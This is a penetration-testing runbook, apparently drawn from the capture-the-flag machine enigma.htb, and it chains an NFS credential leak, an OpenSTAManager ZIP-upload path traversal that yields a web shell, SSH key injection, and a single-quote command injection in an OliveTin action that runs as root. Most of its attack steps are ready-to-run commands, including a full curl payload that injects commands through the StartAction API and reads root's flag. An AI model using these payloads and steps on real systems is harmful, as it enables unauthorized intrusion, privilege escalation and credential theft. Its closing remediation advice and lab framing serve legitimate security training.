# Runbook: NFS leak → CMS RCE → localhost-only service injection

**Use when:** A Linux host exposes NFS plus a CMS/web app, and a root-owned
localhost-only management service (OliveTin, Gitea, Portainer, admin panels)
sits behind loopback. The chain below is the one that rooted **enigma.htb**,
but every step is a *pattern* — verify the local instance before firing.
**Produces:** user shell + root shell.
**Prerequisites:** `showmount`, `scripts/nfsget.py` (userspace NFS, no sudo),
`john`, `ssh-keygen`, `curl`, a Python `requests` helper.

This is a router, not a tutorial. Each state ends in one command and one
decision.

---

## Variables (set once)

```bash
export TARGET="10.X.X.X"
export DOMAIN="target.htb"          # vhost suffix for the web app
export REPORTS="$HOME/.openclaw/workspace/reports/$TARGET"
mkdir -p "$REPORTS"/{creds,loot,exploits,web}
echo "$TARGET ${DOMAIN} support_001.${DOMAIN} mail001.${DOMAIN}" | sudo tee -a /etc/hosts
```

---

## STATE 0 — Which state am I in?

1. `showmount -e $TARGET` returns an export? → **STATE 1.**
2. You have a web shell but it can't reach a loopback service? → **STATE 4.**
3. SSH accepts only publickey and you have *any* local exec? → **STATE 3.**
4. You can reach a root-owned localhost service? → **STATE 5.**

Enumerate both layers in parallel — services *and* files:

```bash
bash scripts/timebox.sh 300 nmap -sV -sC -p- --min-rate 2000 $TARGET -oA "$REPORTS/nmap/all"
```

---

## STATE 1 — NFS export is the cheapest initial leak

```bash
showmount -e $TARGET
# /srv/nfs/onboarding *
```

A `*` / world-readable export is a **file read**, not a shell. Mount it without
sudo when the host blocks `mount -t nfs`:

```bash
python3 scripts/nfsget.py $TARGET /srv/nfs/onboarding "$REPORTS/loot/onboarding"
ls -R "$REPORTS/loot/onboarding"
```

**Decision:** onboarding PDFs / spreadsheets almost always hold default
credentials. Extract `user:pass`, then validate everywhere *before* attacking
anything else:

```bash
# Mail, webmail, CMS, DB, SMB — cheapest first.
curl -u user:pass -sI http://mail001.$DOMAIN/ | head -1
```

---

## STATE 2 — CMS/web app → RCE via admin-only feature abuse

OpenSTAManager here, but the pattern is: *an authenticated upload/settings
feature writes attacker-controlled content into a path the web server serves.*

```bash
# Find the upload handler and the exact form field name.
grep -rn "case 'upload'" modules/*/actions.php modules/*/*.php | head
```

Key findings from enigma:
- The form posts to `controller.php?id_module=<N>` — **not** the module's own
  `actions.php`. Posting to the wrong endpoint silently returns the HTML page.
- The field is often `blob` (a file input), not `file`.
- A ZIP handler with a manifest (`MODULE` ini / `plugin.json` / `composer.json`)
  frequently accepts a `directory` key. Set it to `..` and the extract/copy
  routine writes **into the webroot** (`copyr()` + traversal).
- Missing manifest marker ⇒ handler cleans up and returns 200 with the page.

```bash
python3 reports/$TARGET/exploits/osm-upload-rce.py   # writes ZIP, uploads, probes
```

**Probe rule:** a path that returns **500** exists and executed; **404** means it
does not. That difference is your shell confirmation.

```bash
curl -s "http://$TARGET/<random>.php?0=id"    # → uid=33(www-data)
```

**Chain (R4):** on confirmed shell, immediately add the next-phase H: *locate
app config credentials → crack → escalate.* Pull the app config:

```bash
# In shell: cat config.inc.php → DB user/pass
```

---

## STATE 3 — Sandboxed web shell? Get a real shell

php-fpm pools are frequently **network-isolated**: loopback to their own DB
works, other loopback ports and outbound are dropped. That is why an otherwise
reachable service looks "down" from the webshell.

```bash
# From the webshell: prove the sandbox boundary.
curl -s -m 5 -o /dev/null -w "%{http_code}\n" http://127.0.0.1:1337/   # 000 = blocked
```

**Decision:** if SSH is `publickey` only (nmap `ssh-auth-methods`), inject a key
using the *local* exec you already have (`su - <user>` from www-data works when
the account's password is known):

```bash
ssh-keygen -t ed25519 -f /tmp/target_key -N ""
# Via the webshell as the user:
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<pubkey>" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys

ssh -i /tmp/target_key -o StrictHostKeyChecking=no user@$TARGET 'id; cat ~/user.txt'
```

→ **user.txt.** Note: user.txt must be readable by a *real login user*, not a
service account inside a container.

---

## STATE 4 — Reach the loopback service through the real shell

```bash
curl -s -m 8 -o /dev/null -w "%{http_code}\n" http://127.0.0.1:1337/   # 200
```

Now that you are outside the sandbox, fingerprint the service:

```bash
/usr/local/bin/OliveTin --version      # version=<YYYY.NN.N>
curl -s http://127.0.0.1:1337/ | grep -oE 'src="[^"]+"'   # find the JS bundle
```

---

## STATE 5 — OliveTin (and friends): shell-string injection in an action

OliveTin ≥ v3000 exposes a **Connect-RPC** API, not the legacy REST paths:

```
POST /api/v1.OliveTinApiService/<Method>
Methods: GetDashboard, GetActionBinding, StartAction, StartActionAndWait,
         ExecutionStatus, GetLogs, WhoAmI, DumpPublicIdActionMap
```

**Unauthenticated enum** (works when `authRequireGuestsToLogin: false`):

```bash
curl -s -X POST http://127.0.0.1:1337/api/v1.OliveTinApiService/GetDashboard \
  -H 'Content-Type: application/json' -d '{}' | python3 -m json.tool
```

This leaks each action's **bindingId** — the public identifier the API wants
(it is *not* the internal `id`, and `actionId` is the wrong field: you get
`"action with ID  not found"`).

```bash
curl -s -X POST http://127.0.0.1:1337/api/v1.OliveTinApiService/GetActionBinding \
  -H 'Content-Type: application/json' -d '{"bindingId":"<id>"}'
```

**The bug class:** an action whose `shell:` interpolates an argument directly
into a quoted string, where that argument's `type` is not validated:

```yaml
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

`type: password` accepts anything ⇒ single-quote breakout ⇒ command injection.
The service usually runs as **root**.

```bash
curl -s -X POST http://127.0.0.1:1337/api/v1.OliveTinApiService/StartAction \
  -H 'Content-Type: application/json' -d '{
    "bindingId":"backup_database",
    "arguments":[
      {"name":"db_user","value":"backup_svc"},
      {"name":"db_name","value":"production"},
      {"name":"db_pass","value":"x'"'"'; id > /tmp/pwned; cat /root/root.txt > /tmp/o; chmod 644 /tmp/o; #"}
    ]}'
```

**Gotchas that cost time:**
- Supply **all** required args or the call returns
  `"required arg not provided: <name>"` with `executionStarted:false`.
- Use `StartActionAndWait` when you want the output inline;
  `ExecutionStatus` with the returned `executionTrackingId` also works.
- If the response says `actionTitle: "notfound"`, you sent the wrong field name
  (use `bindingId`, not `actionId`).

```bash
sleep 3; cat /tmp/pwned   # → uid=0(root)
```

→ **root.txt.**

---

## Reporting + hygiene

- Save both flags in `$REPORTS/loot/`; confirm with
  `bash scripts/stop-gate.sh $TARGET --why` (exit 0 requires both).
- Write `$REPORTS/report.md` with the chain, the *exact* injection string, and
  remediation (bind localhost services to localhost **and** require auth; never
  interpolate arguments into a shell string; never run such a service as root).
- Restore anything you changed: remove the injected `authorized_keys` line if
  the engagement rules require clean teardown.

## Why this one is instructive
Every hop was a *trust boundary misplacement*: an export marked world-readable,
an upload feature that resolved `..`, a sandbox mistaken for a dead service, and
an allow-listed management tool that trusted an unvalidated password field
enough to hand it to `sh` as root. None required a memory-corruption exploit.
